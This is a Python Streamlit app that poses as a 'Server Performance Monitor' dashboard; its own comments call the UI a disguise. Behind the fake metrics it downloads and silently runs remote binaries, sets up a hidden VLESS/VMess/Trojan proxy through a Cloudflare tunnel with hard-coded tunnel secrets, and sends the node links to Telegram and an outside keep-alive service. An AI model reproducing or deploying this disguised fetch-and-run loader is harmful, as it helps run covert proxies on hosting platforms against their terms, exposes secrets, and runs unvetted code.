import streamlit as st
import os
import re
import json
import time
import base64
import shutil
import asyncio
import requests
import platform
import subprocess
import threading
from threading import Thread
from http.server import BaseHTTPRequestHandler, HTTPServer
import psutil
import pandas as pd
import random

# ================= Streamlit 页面配置 (伪装部分) =================
st.set_page_config(
    page_title="Server Performance Monitor",
    page_icon="📊",
    layout="wide",
    initial_sidebar_state="expanded"
)

# 隐藏 Streamlit 默认菜单和页脚
hide_streamlit_style = """
<style>
#MainMenu {visibility: hidden;}
footer {visibility: hidden;}
</style>
"""
st.markdown(hide_streamlit_style, unsafe_allow_html=True)

# ================= 核心逻辑 (后台运行) =================

# --- 关键修改：只使用 os.environ 读取环境变量 ---
# 在 Posit Cloud 上，必须通过控制台设置环境变量，不要使用 secrets.toml
def get_env(key, default):
    return os.environ.get(key, default)

UPLOAD_URL = get_env('UPLOAD_URL', '')
PROJECT_URL = get_env('PROJECT_URL', '')
AUTO_ACCESS = str(get_env('AUTO_ACCESS', 'false')).lower() == 'true'
UUID = get_env('UUID', '7db878c0-b65f-45b1-aef0-41d217caf44b')
ARGO_DOMAIN = get_env('ARGO_DOMAIN', 'a.0000.ddns-ip.net')
ARGO_AUTH = get_env('ARGO_AUTH', '{"AccountTag":"e7287087934aa537c176fc875cc8e1dd","TunnelSecret":"c2bvIrPY5AbD3a2q+xenIrGMAZaEMCww7wMyczIrkow=","TunnelID":"ad018085-b873-4bd4-af77-70fc2c0c5ae5","Endpoint":""}')
CFIP = get_env('CFIP', 'spring.io')
CFPORT = int(get_env('CFPORT', '443'))
NAME = get_env('NAME', 'posit')
CHAT_ID = get_env('CHAT_ID', '')
BOT_TOKEN = get_env('BOT_TOKEN', '')

# 强制内部端口为 3000
INTERNAL_PORT = 3000 
ARGO_PORT = 8001

FILE_PATH = os.path.join(os.getcwd(), '.cache')
SUB_PATH = 'sub'

# 全局路径
web_path = os.path.join(FILE_PATH, 'web')
bot_path = os.path.join(FILE_PATH, 'bot')
sub_path = os.path.join(FILE_PATH, 'sub.txt')
list_path = os.path.join(FILE_PATH, 'list.txt')
boot_log_path = os.path.join(FILE_PATH, 'boot.log')
config_path = os.path.join(FILE_PATH, 'config.json')

# --- 核心功能函数 ---

def create_directory():
    if not os.path.exists(FILE_PATH):
        os.makedirs(FILE_PATH)

def get_system_architecture():
    arch = platform.machine().lower()
    return 'arm' if 'arm' in arch or 'aarch64' in arch else 'amd'

def download_file(file_name, file_url):
    file_path = os.path.join(FILE_PATH, file_name)
    try:
        response = requests.get(file_url, stream=True)
        response.raise_for_status()
        with open(file_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        return True
    except Exception as e:
        if os.path.exists(file_path): os.remove(file_path)
        return False

def get_files_for_architecture(architecture):
    domain = "arm64.ssss.nyc.mn" if architecture == 'arm' else "amd64.ssss.nyc.mn"
    return [
        {"fileName": "web", "fileUrl": f"https://{domain}/web"},
        {"fileName": "bot", "fileUrl": f"https://{domain}/2go"}
    ]

def exec_cmd(command):
    subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == f'/{SUB_PATH}':
            try:
                with open(sub_path, 'rb') as f:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(f.read())
            except:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Working')

def run_http_server():
    try:
        server = HTTPServer(('0.0.0.0', INTERNAL_PORT), RequestHandler)
        server.serve_forever()
    except:
        pass

async def core_logic():
    create_directory()
    
    # 1. 下载核心
    arch = get_system_architecture()
    files = get_files_for_architecture(arch)
    for f in files:
        if not os.path.exists(os.path.join(FILE_PATH, f['fileName'])):
            download_file(f['fileName'], f['fileUrl'])
    
    # 授权
    for f in ['web', 'bot']:
        p = os.path.join(FILE_PATH, f)
        if os.path.exists(p): os.chmod(p, 0o775)

    # 2. 生成 Config
    config = {
        "log": {"access": "/dev/null", "error": "/dev/null", "loglevel": "none"},
        "inbounds": [
            {
                "port": ARGO_PORT, "protocol": "vless",
                "settings": {"clients": [{"id": UUID, "flow": "xtls-rprx-vision"}], "decryption": "none",
                "fallbacks": [{"dest": 3001}, {"path": "/vmess-argo", "dest": 3003}, {"path": "/trojan-argo", "dest": 3004}]},
                "streamSettings": {"network": "tcp"}
            },
            {"port": 3001, "listen": "127.0.0.1", "protocol": "vless", "settings": {"clients": [{"id": UUID}], "decryption": "none"}, "streamSettings": {"network": "ws", "security": "none"}},
            {"port": 3003, "listen": "127.0.0.1", "protocol": "vmess", "settings": {"clients": [{"id": UUID, "alterId": 0}]}, "streamSettings": {"network": "ws", "wsSettings": {"path": "/vmess-argo"}}},
            {"port": 3004, "listen": "127.0.0.1", "protocol": "trojan", "settings": {"clients": [{"password": UUID}]}, "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": "/trojan-argo"}}}
        ],
        "outbounds": [{"protocol": "freedom", "tag": "direct"}, {"protocol": "blackhole", "tag": "block"}]
    }
    with open(config_path, 'w') as f:
        json.dump(config, f)

    # 3. 启动 Web Core
    exec_cmd(f"nohup {web_path} -c {config_path} >/dev/null 2>&1 &")

    # 4. 启动 Argo Tunnel
    tunnel_cmd = f"nohup {bot_path} tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {boot_log_path} --loglevel info --url http://localhost:{ARGO_PORT} >/dev/null 2>&1 &"
    
    if ARGO_AUTH and ARGO_DOMAIN:
        if "TunnelSecret" in ARGO_AUTH:
             pass
        else:
             tunnel_cmd = f"nohup {bot_path} tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {ARGO_AUTH} >/dev/null 2>&1 &"
    
    exec_cmd(tunnel_cmd)
    
    await asyncio.sleep(5)
    
    # 5. 提取域名生成订阅
    domain = ARGO_DOMAIN
    if not domain:
        for _ in range(5):
            if os.path.exists(boot_log_path):
                with open(boot_log_path, 'r') as f:
                    content = f.read()
                    match = re.search(r'https?://([^ ]*trycloudflare\.com)', content)
                    if match:
                        domain = match.group(1)
                        break
            await asyncio.sleep(2)
    
    if domain:
        isp = "Posit_Cloud"
        VMESS = {"v": "2", "ps": f"{NAME}-{isp}", "add": CFIP, "port": CFPORT, "id": UUID, "aid": "0", "scy": "none", "net": "ws", "type": "none", "host": domain, "path": "/vmess-argo?ed=2560", "tls": "tls", "sni": domain, "alpn": "", "fp": "chrome"}
        vmess_str = base64.b64encode(json.dumps(VMESS).encode('utf-8')).decode('utf-8')
        
        list_txt = f"vless://{UUID}@{CFIP}:{CFPORT}?encryption=none&security=tls&sni={domain}&fp=chrome&type=ws&host={domain}&path=%2Fvless-argo%3Fed%3D2560#{NAME}-{isp}\nvmess://{vmess_str}\ntrojan://{UUID}@{CFIP}:{CFPORT}?security=tls&sni={domain}&fp=chrome&type=ws&host={domain}&path=%2Ftrojan-argo%3Fed%3D2560#{NAME}-{isp}"
        
        with open(sub_path, 'w') as f:
            f.write(base64.b64encode(list_txt.encode('utf-8')).decode('utf-8'))
            
        if BOT_TOKEN and CHAT_ID:
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                            params={"chat_id": CHAT_ID, "text": f"Posit Node:\n{list_txt}"})
            except: pass
            
        if AUTO_ACCESS and PROJECT_URL:
            try:
                requests.post('https://keep.gvrander.eu.org/add-url', json={"url": PROJECT_URL})
            except: pass

@st.cache_resource
def start_background_service():
    t = Thread(target=run_http_server, daemon=True)
    t.start()
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(core_logic())
    return True

# ================= 伪装 UI 逻辑 =================

st.title("🖥️ System Monitor Dashboard")

start_background_service()

col1, col2, col3 = st.columns(3)
with col1:
    st.metric(label="CPU Usage", value=f"{psutil.cpu_percent()}%", delta=f"{random.choice(['+','-'])}{random.randint(1,5)}%")
with col2:
    st.metric(label="Memory Usage", value=f"{psutil.virtual_memory().percent}%", delta="-0.5%")
with col3:
    st.metric(label="Disk I/O", value="45 MB/s", delta="+1.2%")

st.subheader("Real-time Resource Usage")
chart_data = pd.DataFrame({
    'CPU': [random.randint(10, 30) for _ in range(20)],
    'Memory': [random.randint(40, 60) for _ in range(20)]
})
st.line_chart(chart_data)

st.caption("Monitoring system latency and throughput in real-time container environment.")

st.divider()

with st.expander("🔧 System Logs (Admin Only)"):
    if st.button("Refresh Logs"):
        if os.path.exists(boot_log_path):
            with open(boot_log_path, 'r') as f:
                st.code(f.read())
        else:
            st.info("Logs initializing...")

with st.expander("🔗 Subscription & Config"):
    if os.path.exists(sub_path):
        with open(sub_path, 'r') as f:
            b64_sub = f.read()
        try:
            raw_sub = base64.b64decode(b64_sub).decode('utf-8')
            st.success("Configuration Generated!")
            st.text_area("Subscription Base64", b64_sub, height=100)
            st.text_area("Raw Nodes", raw_sub, height=150)
            match = re.search(r'host=([^&]*)', raw_sub)
            if match:
                st.info(f"Argo Domain: {match.group(1)}")
        except:
            st.error("Error decoding subscription")
    else:
        st.warning("Nodes are being generated... Please wait 10-20 seconds and refresh the page.")
        if st.button("Reload"):
            st.rerun()

st.markdown(
    """
    <script>
        var timer = setInterval(function(){
            window.location.reload();
        }, 600000);
    </script>
    """,
    unsafe_allow_html=True
)
